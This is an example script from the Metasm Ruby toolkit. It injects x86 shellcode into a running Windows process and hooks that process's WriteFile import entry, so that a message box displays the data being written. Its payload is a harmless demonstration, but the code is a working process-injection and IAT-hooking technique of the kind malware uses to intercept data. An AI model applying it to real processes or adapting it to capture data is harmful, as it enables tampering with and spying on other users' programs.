#    This file is part of Metasm, the Ruby assembly manipulation suite
#    Copyright (C) 2007 Yoann GUILLOT
#
#    Licence is LGPL, see LICENCE in the top-level directory


# 
# in this exemple we will patch a process specified on the commandline (pid or part of image name)
# the IAT entry matching /WriteFile/ will be replaced by a pointer to a malicious code we inject,
# which calls back the original function.
# Our shellcode will display the first bytes of the data to be written, using MessageBoxW (whose
# pointer is also retrieved from the target IAT)
#
# usage: ruby w32hook.rb notepad ; then go in notepad, type some words and save to a file
#

require 'metasm'

include Metasm
include WinAPI

# open target
WinAPI.get_debug_privilege
if not pr = WinAPI.find_process((Integer(ARGV.first) rescue ARGV.first))
	# display list of running processes if no target found
	puts WinAPI.list_processes.sort_by { |pr| pr.pid }.map { |pr| "#{pr.pid}: #{File.basename(pr.modules.first.path) rescue nil}" }
	exit
end
raise 'cannot open target process' if not handle = WinAPI.openprocess(PROCESS_ALL_ACCESS, 0, pr.pid)

# virtual mapping of remote process memory
remote_mem = WindowsRemoteString.new(handle)

# read the target PE structure
pe = LoadedPE.load remote_mem[pr.modules[0].addr, 0x1000000]
pe.decode_header
pe.decode_imports

# find iat entries
target = nil
target_p = nil
msgboxw_p = nil
iat_entry_len = pe.encode_xword(0).length	# 64bits portable ! (shellcode probably won't work)
pe.imports.each { |id|
	id.imports.each_with_index { |i, idx|
		case i.name
		when 'MessageBoxW'
			msgboxw_p = pr.modules[0].addr + id.iat_p + iat_entry_len * idx
		when /WriteFile/
			target_p  = pr.modules[0].addr + id.iat_p + iat_entry_len * idx
			target = id.iat[idx]
		end
	}
}
raise "iat entries not found" if not target or not msgboxw_p

# here we write our shellcode (no need to code position-independant)
sc = Shellcode.assemble(Ia32.new, <<EOS)
pushad
mov esi, dword ptr [esp+20h+8]	; 2nd arg = buffer
mov edi, message
mov ecx, 19
xor eax, eax
copy_again:
lodsb
stosw
loop copy_again

push 0
push title
push message
push 0
call [msgboxw]
popad
jmp  target

.align 4
; strings to display
message dw 20 dup(?)
title dw 'I see what you did there...', 0
EOS

# alloc some space in the remote process to put our shellcode
raise 'remote allocation failed' if not injected = WinAPI.virtualallocex(handle, 0, sc.encoded.length, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
puts "injected malicous code at %x" % injected

# fixup the shellcode with its known base address, and with the addresses it will need from the IAT
sc.base_addr = injected
sc.encoded.fixup! 'msgboxw' => msgboxw_p, 'target' => target
raw = sc.encode_string

# inject the shellcode
remote_mem[injected, raw.length] = raw

# rewrite iat entry
iat_h = pe.encode_xword(injected).data
remote_mem[target_p, iat_h.length] = iat_h

# done
WinAPI.closehandle(handle)
